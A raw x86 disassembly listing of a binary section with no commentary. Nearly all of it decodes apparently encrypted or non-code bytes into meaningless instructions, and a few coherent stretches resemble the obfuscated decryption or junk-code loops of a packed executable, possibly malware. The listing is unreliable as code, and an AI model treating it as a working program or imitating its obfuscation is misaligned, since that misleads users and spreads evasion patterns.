  40d62f:	mov    DWORD PTR [ecx-0x14d154fa],esi
  40d635:	or     DWORD PTR ds:0x77934945,esp
  40d63b:	sbb    eax,0x58a1abc2
  40d640:	in     eax,dx
  40d641:	mov    BYTE PTR [esi-0x3b],cl
  40d644:	ret    0xe7d0
  40d647:	lahf   
  40d648:	and    ebp,DWORD PTR [eax]
  40d64a:	and    bh,ah
  40d64c:	or     al,0x14
  40d64e:	xchg   edi,eax
  40d64f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d650:	int3   
  40d651:	cmp    DWORD PTR [edx],ebp
  40d653:	push   ss
  40d654:	push   edi
  40d655:	and    BYTE PTR [edx+edi*4+0x6f],cl
  40d659:	mov    al,0x60
  40d65b:	into   
  40d65c:	inc    edi
  40d65d:	add    DWORD PTR [esi+esi*2+0x10],esi
  40d661:	es aas 
  40d663:	adc    DWORD PTR [eax+0x1d],0x42cf355a
  40d66a:	iret   
  40d66b:	add    esi,edx
  40d66d:	cs mov esi,0x796d7f28
  40d673:	or     al,0xbb
  40d675:	mov    esp,0x5fd0dd7e
  40d67a:	loope  0x40d66c
  40d67c:	stos   DWORD PTR es:[di],eax
  40d67e:	push   esp
  40d67f:	adc    al,0x63
  40d681:	out    0x6d,eax
  40d683:	mov    eax,ds:0xfaee744e
  40d688:	in     al,dx
  40d689:	pop    ss
  40d68a:	out    dx,al
  40d68b:	add    DWORD PTR es:[ebx],ebx
  40d68e:	jbe    0x40d65f
  40d690:	daa    
  40d691:	mov    eax,0x4af0ae2b
  40d696:	hlt    
  40d697:	arpl   dx,bp
  40d699:	pop    edi
  40d69a:	cwde   
  40d69b:	mov    ebp,0x103d7a49
  40d6a0:	push   ebx
  40d6a1:	fild   DWORD PTR [ecx-0x3f]
  40d6a4:	or     esi,DWORD PTR [ecx+ebx*1-0x2961034d]
  40d6ab:	dec    edx
  40d6ac:	cmp    edi,eax
  40d6ae:	mov    bl,0x1d
  40d6b0:	sahf   
  40d6b1:	jecxz  0x40d698
  40d6b3:	pop    es
  40d6b4:	inc    ebp
  40d6b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6b6:	sbb    eax,0x5aafff1a
  40d6bb:	ds stc 
  40d6bd:	sti    
  40d6be:	lock fiadd DWORD PTR [ecx-0x2b03ee43]
  40d6c5:	fld    DWORD PTR ds:0x1f9bacbb
  40d6cb:	or     ah,bl
  40d6cd:	mov    eax,0xd6effe14
  40d6d2:	pop    ebx
  40d6d3:	inc    ecx
  40d6d4:	mov    BYTE PTR [edi-0x7df56186],0xa2
  40d6db:	mov    ah,0xa3
  40d6dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6de:	pop    es
  40d6df:	out    0x5,al
  40d6e1:	ins    DWORD PTR es:[edi],dx
  40d6e2:	push   es
  40d6e3:	or     edx,DWORD PTR [ebp-0x38]
  40d6e6:	loope  0x40d6fe
  40d6e8:	imul   edx,ebp,0xffffffce
  40d6eb:	arpl   bp,bp
  40d6ed:	pop    ecx
  40d6ee:	fisubr DWORD PTR [ebx+0x51]
  40d6f1:	cmp    BYTE PTR [eax],ah
  40d6f3:	push   ebx
  40d6f4:	fwait
  40d6f5:	in     eax,dx
  40d6f6:	stos   DWORD PTR es:[edi],eax
  40d6f7:	pop    esp
  40d6f8:	lahf   
  40d6f9:	cs retf 0x2c3d
  40d6fd:	inc    ecx
  40d6fe:	into   
  40d6ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d701:	mov    bl,0xd5
  40d703:	cmc    
  40d704:	out    0xcb,eax
  40d706:	push   eax
  40d707:	xchg   ebx,eax
  40d708:	jb     0x40d72e
  40d70a:	sbb    dl,0x3c
  40d70d:	mov    ebx,0xfdc44777
  40d712:	stos   DWORD PTR es:[edi],eax
  40d713:	lods   al,BYTE PTR ds:[esi]
  40d714:	aas    
  40d715:	jne    0x40d6dc
  40d717:	imul   edx,ebx,0x6a
  40d71a:	imul   ebp,ecx,0xd76f0eaf
  40d720:	jp     0x40d798
  40d722:	adc    ch,al
  40d724:	sar    BYTE PTR [edx+0x77b74197],cl
  40d72a:	lea    edx,[ebx+0x78]
  40d72d:	sub    eax,DWORD PTR fs:[esi]
  40d730:	sub    bl,dl
  40d732:	and    ebp,ecx
  40d734:	aad    0xba
  40d736:	js     0x40d6d1
  40d738:	mov    ecx,0xd44e26dc
  40d73d:	retf   
  40d73e:	sub    BYTE PTR [ebp-0x5a],dh
  40d741:	jno    0x40d790
  40d743:	sbb    eax,0x784a0d1d
  40d748:	cwde   
  40d749:	cld    
  40d74a:	ret    
  40d74b:	mov    ah,BYTE PTR [esi+0x41]
  40d74e:	sub    ch,BYTE PTR [esi+0x99cc5cd]
  40d754:	jnp    0x40d7cd
  40d756:	mov    ah,0xf7
  40d758:	scas   al,BYTE PTR es:[edi]
  40d759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d75a:	jbe    0x40d6e3
  40d75c:	bound  ebx,QWORD PTR [ebp+0x3c]
  40d75f:	add    ecx,esp
  40d761:	ins    BYTE PTR es:[edi],dx
  40d762:	sbb    eax,0x21652540
  40d767:	aam    0xaf
  40d769:	xor    BYTE PTR [eax-0x7a72aad0],dl
  40d76f:	xchg   edx,eax
  40d770:	sub    esi,DWORD PTR [eax+0x4775673c]
  40d776:	inc    ebp
  40d777:	mov    bl,0xb7
  40d779:	xchg   ebp,eax
  40d77a:	xchg   esi,eax
  40d77b:	jge    0x40d730
  40d77d:	dec    ecx
  40d77e:	push   ecx
  40d77f:	dec    ecx
  40d780:	stos   DWORD PTR es:[edi],eax
  40d781:	repz cwde 
  40d783:	js     0x40d77a
  40d785:	and    BYTE PTR [edx],bh
  40d787:	leave  
  40d788:	jnp    0x40d738
  40d78a:	fnstcw WORD PTR [ecx+0x62488b11]
  40d790:	pushf  
  40d791:	int3   
  40d792:	pop    es
  40d793:	iret   
  40d794:	sbb    DWORD PTR [ecx+0x553002d1],0xc62ee029
  40d79e:	xor    BYTE PTR [eax],0xb9
  40d7a1:	pop    esi
  40d7a2:	arpl   WORD PTR [ecx],bp
  40d7a4:	in     eax,dx
  40d7a5:	mov    dh,0xef
  40d7a7:	mov    dl,0xdf
  40d7a9:	clc    
  40d7aa:	dec    ebp
  40d7ab:	or     ch,BYTE PTR [eax]
  40d7ad:	daa    
  40d7ae:	mov    ds:0x79a4fee2,eax
  40d7b3:	stos   BYTE PTR es:[edi],al
  40d7b4:	mov    ch,0xfd
  40d7b6:	mov    ds:0xda2d098b,al
  40d7bb:	and    al,BYTE PTR [ecx+0x33cff]
  40d7c1:	add    bh,al
  40d7c3:	add    eax,0x42af3d
  40d7c8:	mov    ebp,0xf000014
  40d7cd:	test   DWORD PTR [edi],edi
  40d7cf:	add    eax,0x5230000
  40d7d4:	inc    ebp
  40d7d5:	scas   eax,DWORD PTR es:[edi]
  40d7d6:	inc    edx
  40d7d7:	add    cl,ch
  40d7d9:	push   ebx
  40d7da:	add    al,BYTE PTR [eax]
  40d7dc:	add    ch,cl
  40d7de:	retf   0xced6
  40d7e1:	(bad)  
  40d7e3:	aad    0xc9
  40d7e5:	lea    edi,[esi-0x506d1ba3]
  40d7eb:	and    DWORD PTR [ecx+ebx*2-0x57],ebx
  40d7ef:	js     0x40d869
  40d7f1:	xor    eax,0xe678787e
  40d7f6:	retf   0x4b8b
  40d7f9:	aad    0x95
  40d7fb:	mov    al,ds:0x993f691f
  40d800:	imul   ebp,DWORD PTR [ebx],0x34
  40d803:	push   ebx
  40d804:	sub    dl,BYTE PTR [ebx-0x578d47ff]
  40d80a:	call   0xb9900e1
  40d80f:	das    
  40d810:	mov    bh,0x35
  40d812:	adc    eax,0x593c62a0
  40d817:	pop    ebx
  40d818:	xor    DWORD PTR [ebp-0x70],ebx
  40d81b:	pop    ds
  40d81c:	lock test BYTE PTR [edx-0x3a],cl
  40d820:	sub    DWORD PTR [eax+0x76ff0f57],0xffffffce
  40d827:	add    DWORD PTR [edi+0x7b],ebp
  40d82a:	test   DWORD PTR [edi+0x547eb506],ebx
  40d830:	xor    BYTE PTR [eax+edi*4+0x1a],0x64
  40d835:	hlt    
  40d836:	cmp    ebx,eax
  40d838:	in     eax,dx
  40d839:	ins    DWORD PTR es:[edi],dx
  40d83a:	xchg   ebp,eax
  40d83b:	repnz cmp ah,ah
  40d83e:	stc    
  40d83f:	sbb    ecx,DWORD PTR [edi]
  40d841:	enter  0xe52c,0xe
  40d845:	xchg   bl,dh
  40d847:	mov    DWORD PTR [ebx+0x55],eax
  40d84a:	ja     0x40d87f
  40d84c:	sub    al,0xb3
  40d84e:	mov    ds:0x6557c1e8,eax
  40d853:	leave  
  40d854:	inc    eax
  40d855:	iret   
  40d856:	mov    bl,BYTE PTR cs:[ebx-0x40]
  40d85a:	jp     0x40d812
  40d85c:	inc    edi
  40d85d:	pop    ecx
  40d85e:	rcl    ebp,1
  40d860:	call   0xead10d39
  40d865:	outs   dx,DWORD PTR ds:[esi]
  40d866:	and    eax,0x35dc636
  40d86b:	aam    0x6a
  40d86d:	add    ecx,DWORD PTR [ebx+0x26d1e9ff]
  40d873:	arpl   WORD PTR [edi],dx
  40d875:	jl     0x40d8bd
  40d877:	and    ah,dh
  40d879:	dec    esp
  40d87a:	add    DWORD PTR [ebp-0x5f],ebx
  40d87d:	add    DWORD PTR [eax+0x2550ebf2],0xffffffa1
  40d884:	sahf   
  40d885:	or     al,BYTE PTR [eax+0x55aac126]
  40d88b:	daa    
  40d88c:	int    0xd4
  40d88e:	mov    al,ds:0xccf1189
  40d893:	xchg   esp,eax
  40d894:	repz cmp al,0xf1
  40d897:	inc    ecx
  40d898:	or     BYTE PTR [edi-0x7fe13a93],dh
  40d89e:	ja     0x40d8a9
  40d8a0:	push   0x4ff9c42
  40d8a5:	(bad)  
  40d8a6:	jmp    0x31d1:0x952f81ee
  40d8ad:	js     0x40d905
  40d8af:	loop   0x40d8c6
  40d8b1:	mov    eax,ds:0x3cf93078
  40d8b6:	leave  
  40d8b7:	cmp    ecx,DWORD PTR [ecx]
  40d8b9:	jge    0x40d881
  40d8bb:	and    DWORD PTR [eax-0x39],ecx
  40d8be:	imul   cl
  40d8c0:	pop    ds
  40d8c1:	fwait
  40d8c2:	mov    BYTE PTR [esi*1+0x6b5225e4],bh
  40d8c9:	div    esi
  40d8cb:	xor    DWORD PTR [edi],esp
  40d8cd:	es sahf 
  40d8cf:	sbb    BYTE PTR [edx],0xc1
  40d8d2:	outs   dx,DWORD PTR ds:[esi]
  40d8d3:	sbb    dh,dh
  40d8d5:	das    
  40d8d6:	fadd   QWORD PTR [edi]
  40d8d8:	mov    BYTE PTR [ecx+ecx*2],dl
  40d8db:	shr    DWORD PTR [edi-0x1],cl
  40d8de:	sbb    al,0xa4
  40d8e0:	(bad)  
  40d8e1:	call   0x98a99b12
  40d8e6:	xor    esi,ecx
  40d8e8:	je     0x40d948
  40d8ea:	out    dx,al
  40d8eb:	ss jmp 0x7d0d8822
  40d8f1:	adc    eax,0xcf876aac
  40d8f6:	inc    eax
  40d8f7:	add    ebx,DWORD PTR [eax-0x12e8ede9]
  40d8fd:	loope  0x40d8ea
  40d8ff:	out    dx,eax
  40d900:	jno    0x40d925
  40d902:	fisubr WORD PTR [ecx]
  40d904:	add    al,0x37
  40d906:	sub    BYTE PTR [ecx],0x68
  40d909:	push   ecx
  40d90a:	push   ebx
  40d90b:	or     al,0xa7
  40d90d:	xor    ebx,DWORD PTR [esi+0x696480ca]
  40d913:	sbb    BYTE PTR [edx],dh
  40d915:	stos   DWORD PTR es:[edi],eax
  40d916:	mov    al,0xa9
  40d918:	push   esi
  40d919:	aaa    
  40d91a:	fst    DWORD PTR [esi+0x68]
  40d91d:	xchg   esi,eax
  40d91e:	inc    esp
  40d91f:	cmp    al,0x3a
  40d921:	push   edx
  40d922:	push   eax
  40d923:	or     eax,0x125459aa
  40d928:	in     al,dx
  40d929:	mov    edi,0xaa294101
  40d92e:	xchg   ebp,eax
  40d92f:	and    ebp,DWORD PTR [edx+0x2b]
  40d932:	or     eax,0x4e6ad2b6
  40d937:	or     eax,DWORD PTR [edi-0x39]
  40d93a:	push   ss
  40d93b:	jl     0x40d931
  40d93d:	(bad)  
  40d93e:	jne    0x40d934
  40d940:	test   eax,0xe2432a32
  40d945:	std    
  40d946:	mov    esp,0xdde741e5
  40d94b:	psubq  mm7,QWORD PTR [esi+0x19c2a1a1]
  40d952:	imul   edx,DWORD PTR [edi-0x57],0xa1015b25
  40d959:	in     eax,0x0
  40d95b:	daa    
  40d95c:	(bad)  
  40d95d:	(bad)  
  40d95e:	pop    eax
  40d95f:	shr    ebx,cl
  40d961:	inc    DWORD PTR [esi-0x75]
  40d964:	lea    esp,[ebp+0x103cbca8]
  40d96a:	push   edx
  40d96b:	pop    ss
  40d96c:	iret   
  40d96d:	jns    0x40d935
  40d96f:	and    ah,BYTE PTR [ebp+0x16]
  40d972:	push   ss
  40d973:	shl    DWORD PTR [edi],1
  40d975:	jge    0x40d995
  40d977:	pop    ds
  40d978:	pop    ds
  40d979:	inc    edi
  40d97a:	outs   dx,DWORD PTR ds:[esi]
  40d97b:	and    bh,cl
  40d97d:	jp     0x40d9af
  40d97f:	mov    DWORD PTR [ebx+0x65],esi
  40d982:	and    BYTE PTR ds:0x9319ef39,dh
  40d988:	or     cl,bl
  40d98a:	repz cmp eax,0xf76adf7d
  40d990:	inc    edi
  40d991:	mov    ebp,0x198eb882
  40d996:	into   
  40d997:	xor    eax,0x1d7f396b
  40d99c:	pop    es
  40d99d:	xchg   ebx,eax
  40d99e:	in     eax,dx
  40d99f:	es das 
  40d9a1:	mov    edx,0x3cdebfc
  40d9a6:	rol    bh,cl
  40d9a8:	inc    eax
  40d9a9:	(bad)  
  40d9aa:	pop    edi
  40d9ab:	push   eax
  40d9ac:	pop    esp
  40d9ad:	rol    BYTE PTR [ecx-0x7a15aea9],0x30
  40d9b4:	jle    0x40d9b2
  40d9b6:	or     ebx,DWORD PTR [ebx-0x1c]
  40d9b9:	(bad)  
  40d9ba:	fisub  DWORD PTR gs:0x1eaa4ee6
  40d9c1:	xchg   DWORD PTR [eax+0x67041c0c],eax
  40d9c7:	lods   al,BYTE PTR ds:[esi]
  40d9c8:	out    dx,al
  40d9c9:	pushf  
  40d9ca:	push   edi
  40d9cb:	adc    cl,al
  40d9cd:	and    dl,dl
  40d9cf:	pop    ebx
  40d9d0:	lahf   
  40d9d1:	scas   eax,DWORD PTR es:[edi]
  40d9d2:	loop   0x40d993
  40d9d4:	popa   
  40d9d5:	lahf   
  40d9d6:	add    al,0x9
  40d9d8:	iret   
  40d9d9:	fisttp WORD PTR [esi+eiz*2-0x335adb86]
  40d9e0:	adc    BYTE PTR [ecx+0x263c77],ah
  40d9e6:	mov    esp,0xc0880acb
  40d9eb:	in     al,dx
  40d9ec:	int3   
  40d9ed:	sub    ch,BYTE PTR [edi-0xb]
  40d9f0:	inc    DWORD PTR ss:[ecx+0x6d574f4f]
  40d9f7:	imul   edi,DWORD PTR [esi+0x6d],0xffffff97
  40d9fb:	lock and bl,cl
  40d9fe:	adc    ebx,DWORD PTR [edx]
  40da00:	sar    DWORD PTR [edx],0xa7
  40da03:	(bad)  
  40da04:	(bad)  
  40da05:	out    dx,al
  40da06:	jo     0x40da3c
  40da08:	(bad)  
  40da09:	xor    ah,bl
  40da0b:	push   edi
  40da0c:	inc    ebp
  40da0d:	ss iret 
  40da0f:	test   eax,0x967e56b3
  40da14:	sub    edi,DWORD PTR [ebx+0x30324a66]
  40da1a:	div    DWORD PTR [ecx+0x5]
  40da1d:	adc    BYTE PTR [esi-0x7a],0xa3
  40da21:	xchg   esi,eax
  40da22:	cmp    al,0x29
  40da24:	jbe    0x40da1b
  40da26:	rcr    DWORD PTR [esi-0x6f],cl
  40da29:	fisttp QWORD PTR [edx]
  40da2b:	pop    es
  40da2c:	rcl    BYTE PTR [edx-0x1b],cl
  40da2f:	and    DWORD PTR [ebx-0x5efff79b],eax
  40da35:	mov    cl,0xaf
  40da37:	inc    edx
  40da38:	add    BYTE PTR [ebx],bl
  40da3a:	add    eax,0x42af89
  40da3f:	mov    ds:0x42afb1,eax
  40da44:	mov    eax,DWORD PTR [ebp-0x8]
  40da47:	xor    DWORD PTR ds:0x42af71,0x42af3d
  40da51:	sub    eax,DWORD PTR [ebp+0x8]
  40da54:	or     DWORD PTR ds:0x42af81,0xc38
  40da5e:	push   eax
  40da5f:	adc    DWORD PTR ds:0x42aef1,0x6147
  40da69:	mov    eax,DWORD PTR [ebp-0x4]
  40da6c:	jmp    0x40dcc4
  40da71:	enter  0xc6c0,0x3c
  40da75:	(bad)  
  40da76:	ret    0xd4da
  40da79:	push   cs
  40da7a:	in     al,dx
  40da7b:	pop    edi
  40da7c:	dec    esi
  40da7d:	dec    ebx
  40da7e:	inc    edi
  40da7f:	xor    edi,eax
  40da81:	push   ss
  40da82:	scas   al,BYTE PTR es:[edi]
  40da83:	js     0x40dafd
  40da85:	xor    eax,0xb178787e
  40da8a:	aaa    
  40da8b:	pusha  
  40da8c:	pop    es
  40da8d:	icebp  
  40da8e:	out    0xc7,eax
  40da90:	inc    esp
  40da91:	int    0x2c
  40da93:	add    ah,dh
  40da95:	xchg   esp,eax
  40da96:	aaa    
  40da97:	mov    ah,0x9a
  40da99:	test   al,0x57
  40da9b:	dec    edx
  40da9c:	lods   eax,DWORD PTR ds:[esi]
  40da9d:	xlat   BYTE PTR ds:[ebx]
  40da9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da9f:	test   DWORD PTR [esi-0x2d89fac0],edi
  40daa5:	inc    esp
  40daa6:	pop    ebp
  40daa7:	retf   
  40daa8:	mov    al,ds:0x520ceefe
  40daad:	jmp    0xb55944d
  40dab2:	jno    0x40dacd
  40dab4:	out    dx,eax
  40dab5:	sub    bh,BYTE PTR [esi]
  40dab7:	inc    esp
  40dab8:	adc    ch,ah
  40daba:	inc    edx
  40dabb:	jnp    0x40da51
  40dabd:	push   ds
  40dabe:	and    DWORD PTR [eax+0x5d9c46aa],0xffffffcc
  40dac5:	or     al,0x7b
  40dac7:	ds retf 0x860
  40dacb:	ret    
  40dacc:	sbb    al,0x2d
  40dace:	mov    bh,bl
  40dad0:	stc    
  40dad1:	lds    eax,FWORD PTR [ecx+0x33]
  40dad4:	jmp    DWORD PTR [eax+0x236eea7b]
  40dada:	or     bl,BYTE PTR [esp+esi*2]
  40dadd:	icebp  
  40dade:	mov    eax,0x30771f1d
  40dae3:	xchg   edi,eax
  40dae4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dae5:	jne    0x40db04
  40dae7:	test   eax,0xed730e28
  40daec:	lods   eax,DWORD PTR ds:[esi]
  40daed:	bnd jb 0x40dae9
  40daf0:	or     esi,DWORD PTR es:[ecx-0xa29b08b]
  40daf7:	das    
  40daf8:	ds or  al,0x6d
  40dafb:	fwait
  40dafc:	arpl   WORD PTR [ecx-0x7c],ax
  40daff:	add    eax,0x2de5bd2c
  40db04:	lds    ebx,FWORD PTR [eax+ecx*8+0x4]
  40db08:	jno    0x40db76
  40db0a:	mov    ch,0x7
  40db0c:	inc    esi
  40db0d:	and    bl,BYTE PTR [edx+0x47]
  40db10:	pusha  
  40db11:	mov    al,ds:0x1020ff7a
  40db16:	fild   QWORD PTR [edx]
  40db18:	in     eax,0xd
  40db1a:	jmp    0xcdd2:0xcc31d272
  40db21:	mov    esp,0x1a8d92a
  40db26:	stos   DWORD PTR es:[edi],eax
  40db27:	jge    0x40db2f
  40db29:	lahf   
  40db2a:	adc    bh,BYTE PTR es:[esp+ebp*2-0x7c67cd6a]
  40db32:	pop    ebp
  40db33:	addr16 das 
  40db35:	test   DWORD PTR ds:0x56365765,ebx
  40db3b:	dec    edi
  40db3c:	rsqrtps xmm6,XMMWORD PTR [ebx]
  40db3f:	sbb    al,0x71
  40db41:	dec    esi
  40db42:	cmc    
  40db43:	idiv   BYTE PTR [eax-0x21f8e3c6]
  40db49:	adc    al,0x6e
  40db4b:	adc    BYTE PTR [edi],0xf5
  40db4e:	mov    esi,0x6ee73fb7
  40db53:	ds aas 
  40db55:	aad    0x98
  40db57:	push   ss
  40db58:	test   BYTE PTR [edx],ah
  40db5a:	xchg   ebp,eax
  40db5b:	pusha  
  40db5c:	test   al,0x64
  40db5e:	jge    0x40db1f
  40db60:	cli    
  40db61:	or     esi,DWORD PTR [esi]
  40db63:	sub    eax,0xfed7f8e2
  40db68:	shr    ch,cl
  40db6a:	add    BYTE PTR [ebx+0x2e],dh
  40db6d:	mov    edi,0x9107f3ec
  40db72:	jbe    0x40db82
  40db74:	ret    
  40db75:	xchg   edx,eax
  40db76:	xchg   esp,eax
  40db77:	rcr    BYTE PTR [edx-0x48e16b59],1
  40db7d:	cmp    DWORD PTR [edx+0x7f74eaa1],edi
  40db83:	xor    al,0xba
  40db85:	xor    DWORD PTR [ecx+ebp*4-0x675f9a8b],esp
  40db8c:	(bad)  
  40db8d:	cmc    
  40db8e:	push   edx
  40db8f:	cmp    bl,ah
  40db91:	pop    eax
  40db92:	push   0x1a
  40db94:	cs iret 
  40db96:	mov    bh,0x2
  40db98:	cmp    dl,dl
  40db9a:	xor    dl,bl
  40db9c:	mov    WORD PTR [esi],?
  40db9e:	add    BYTE PTR [esi+0x3ccf9943],0xcf
  40dba5:	nop
  40dba6:	in     eax,0xdf
  40dba8:	dec    esp
  40dba9:	xchg   edi,eax
  40dbaa:	scas   eax,DWORD PTR es:[edi]
  40dbab:	pusha  
  40dbac:	pop    eax
  40dbad:	push   es
  40dbae:	jmp    0x71952ba2
  40dbb3:	test   DWORD PTR [ebp+0x7f],ebp
  40dbb6:	mov    eax,0x6870999c
  40dbbb:	fisubr WORD PTR ds:[eax-0x1c]
  40dbbf:	xchg   esi,eax
  40dbc0:	adc    eax,0x6df7eb07
  40dbc5:	jmp    ebp
  40dbc7:	ds xchg edi,eax
  40dbc9:	push   ss
  40dbca:	xor    al,0xf7
  40dbcc:	push   edx
  40dbcd:	add    al,0x90
  40dbcf:	or     ah,BYTE PTR [ebx-0x3d]
  40dbd2:	aam    0xb8
  40dbd4:	and    BYTE PTR [ebp+0x1f09a83c],0xa4
  40dbdb:	sbb    BYTE PTR [eax-0x23],dh
  40dbde:	add    bh,BYTE PTR [ebp+esi*1-0x12]
  40dbe2:	mov    esp,0x4fcbf0bb
  40dbe7:	cli    
  40dbe8:	dec    edx
  40dbe9:	mov    dl,0x11
  40dbeb:	mov    ds:0x2611754,al
  40dbf0:	push   edx
  40dbf1:	push   ds
  40dbf2:	sbb    bl,BYTE PTR [edx+ebp*2-0x35]
  40dbf6:	jp     0x40dc4a
  40dbf8:	iret   
  40dbf9:	retf   0x1c9f
  40dbfc:	jns    0x40dba3
  40dbfe:	arpl   WORD PTR [ecx+edx*2],sp
  40dc01:	adc    eax,0x144f718a
  40dc06:	shl    DWORD PTR [ebp-0x972ce4a],cl
  40dc0c:	stc    
  40dc0d:	pop    eax
  40dc0e:	call   0xf12a:0xa967403f
  40dc15:	arpl   si,ax
  40dc17:	scas   eax,DWORD PTR es:[edi]
  40dc18:	lods   al,BYTE PTR ds:[esi]
  40dc19:	(bad)  
  40dc1b:	fs dec edx
  40dc1d:	xchg   esp,eax
  40dc1e:	fldcw  WORD PTR [edx+0x31771e80]
  40dc24:	shr    DWORD PTR [edi],cl
  40dc26:	ja     0x40dca6
  40dc28:	inc    esp
  40dc29:	or     cl,BYTE PTR [edi]
  40dc2b:	sbb    edx,DWORD PTR [ebx]
  40dc2d:	inc    esp
  40dc2e:	je     0x40dbfc
  40dc30:	dec    esp
  40dc31:	stos   DWORD PTR es:[edi],eax
  40dc32:	push   esp
  40dc33:	or     BYTE PTR [esi+0x5c],bl
  40dc36:	cmc    
  40dc37:	or     al,BYTE PTR [edi+esi*4+0x33]
  40dc3b:	inc    ecx
  40dc3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc3d:	das    
  40dc3e:	jae    0x40dc39
  40dc40:	cmp    ch,al
  40dc42:	mov    al,ch
  40dc44:	cmp    edx,DWORD PTR [ebp+0x71]
  40dc47:	inc    ebx
  40dc48:	or     dl,al
  40dc4a:	xlat   BYTE PTR ds:[ebx]
  40dc4b:	mov    BYTE PTR [ebx],dl
  40dc4d:	std    
  40dc4e:	inc    ebx
  40dc4f:	lahf   
  40dc50:	test   eax,0xfafb9f24
  40dc55:	(bad)  [ebx-0x1b2b8e30]
  40dc5b:	sbb    eax,0x2bacd1c1
  40dc60:	lahf   
  40dc61:	ins    DWORD PTR es:[edi],dx
  40dc62:	aam    0xe6
  40dc64:	icebp  
  40dc65:	fst    QWORD PTR [ebx+0xe]
  40dc68:	call   0xb5b14443
  40dc6d:	fadd   QWORD PTR [eax]
  40dc6f:	pop    ebp
  40dc70:	out    dx,eax
  40dc71:	stos   BYTE PTR es:[edi],al
  40dc72:	xchg   esp,eax
  40dc73:	sub    DWORD PTR [ebp+0x0],esi
  40dc76:	add    al,0x74
  40dc78:	and    bh,dh
  40dc7a:	call   0xa91e:0xe5662c90
  40dc81:	out    dx,al
  40dc82:	mov    bh,0x30
  40dc84:	add    dh,BYTE PTR [edx]
  40dc86:	cdq    
  40dc87:	xchg   esi,eax
  40dc88:	or     BYTE PTR [ebx+0xfb151a],al
  40dc8e:	fistp  DWORD PTR [eax-0x2f7beac8]
  40dc94:	pop    eax
  40dc95:	add    DWORD PTR [esi],esp
  40dc97:	xchg   edi,eax
  40dc98:	mov    ss,WORD PTR [ebp-0x3e746cd7]
  40dc9e:	and    BYTE PTR [edi+0x71],bl
  40dca1:	aam    0x41
  40dca3:	int    0xed
  40dca5:	scas   eax,DWORD PTR es:[edi]
  40dca6:	inc    edx
  40dca7:	jl     0x40dd0d
  40dca9:	mov    BYTE PTR [ecx+0x22daa568],dl
  40dcaf:	pop    ebp
  40dcb0:	mov    esi,0xe982ae09
  40dcb5:	mov    ch,0x3b
  40dcb7:	mov    fs,WORD PTR [eax-0x3fd4bb14]
  40dcbd:	pop    ecx
  40dcbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcbf:	std    
  40dcc0:	lds    edi,FWORD PTR [edx+0x5b]
  40dcc3:	xchg   ebp,eax
  40dcc4:	add    eax,DWORD PTR [ebp+0x8]
  40dcc7:	add    DWORD PTR ds:0x42b001,0x296a
  40dcd1:	push   eax
  40dcd2:	adc    DWORD PTR ds:0x42aedd,0x7658
  40dcdc:	call   0x40e99f
  40dce1:	mov    DWORD PTR ds:0x42af35,0x7bae
  40dceb:	inc    DWORD PTR [ebp+0x8]
  40dcee:	cmp    DWORD PTR [ebp+0x8],0x52
  40dcf2:	mov    DWORD PTR ds:0x42afb1,0x71fa
  40dcfc:	jb     0x40da34
  40dd02:	mov    DWORD PTR ds:0x42afbd,0x568b
  40dd0c:	jmp    0x40e979
  40dd11:	cmp    edi,0x1a2
  40dd17:	jne    0x40e497
  40dd1d:	sbb    DWORD PTR ds:0x42af39,edx
  40dd23:	mov    DWORD PTR [ebp-0x60],0xf89c853c
  40dd2a:	mov    eax,DWORD PTR [ebp-0x4]
  40dd2d:	mov    DWORD PTR [ebp-0x5c],eax
  40dd30:	mov    eax,DWORD PTR [ebp-0x8]
  40dd33:	mov    DWORD PTR [ebp-0x58],eax
  40dd36:	movzx  eax,WORD PTR ds:0x42af31
  40dd3d:	and    DWORD PTR ds:0x42af01,eax
  40dd43:	mov    eax,DWORD PTR [ebp-0xc]
  40dd46:	adc    DWORD PTR ds:0x42aff1,0x42affd
  40dd50:	xor    eax,esi
  40dd52:	jmp    0x40dfaa
  40dd57:	rol    eax,0x3e
  40dd5a:	leave  
  40dd5b:	leave  
  40dd5c:	leave  
  40dd5d:	leave  
  40dd5e:	rcr    BYTE PTR [ebx+0x66],0x3b
  40dd62:	inc    esi
  40dd63:	xchg   ecx,eax
  40dd64:	jle    0x40dd8e
  40dd66:	outs   dx,BYTE PTR ds:[esi]
  40dd67:	shr    DWORD PTR [eax+edi*2+0x787e3578],cl
  40dd6e:	js     0x40ddc7
  40dd70:	xchg   esi,eax
  40dd71:	fisub  WORD PTR [ecx+eiz*8-0x65e83bf1]
  40dd78:	sti    
  40dd79:	sar    eax,cl
  40dd7b:	mov    ch,0x1
  40dd7d:	dec    ecx
  40dd7e:	bound  edx,QWORD PTR [eax]
  40dd80:	test   edi,esi
  40dd82:	inc    esp
  40dd83:	pop    ds
  40dd84:	es scas eax,DWORD PTR es:[edi]
  40dd86:	ss cli 
  40dd88:	dec    esp
  40dd89:	sbb    bh,BYTE PTR [ebp-0xe2e86ae]
  40dd8f:	and    eax,0x5ac1a5a8
  40dd94:	jmp    0xb76c:0xa92d56de
  40dd9b:	ficom  WORD PTR ds:0xb206e9f1
  40dda1:	fsubr  DWORD PTR [edi]
  40dda3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dda4:	inc    esp
  40dda5:	cmp    dl,BYTE PTR [edi-0x6aeced78]
  40ddab:	shr    DWORD PTR [esi-0x76cf0c3c],cl
  40ddb1:	sbb    al,0x16
  40ddb3:	xchg   esp,eax
  40ddb4:	test   ah,ch
  40ddb6:	add    al,0x42
  40ddb8:	cmp    DWORD PTR [ebx],esp
  40ddba:	jl     0x40dd93
  40ddbc:	jbe    0x40de37
  40ddbe:	aam    0xeb
  40ddc0:	div    DWORD PTR [esi+0x1a]
  40ddc3:	mov    al,ds:0xa5b7e590
  40ddc8:	fmulp  st(5),st
  40ddca:	mov    ch,0x31
  40ddcc:	xor    esi,edx
  40ddce:	hlt    
  40ddcf:	xchg   esi,eax
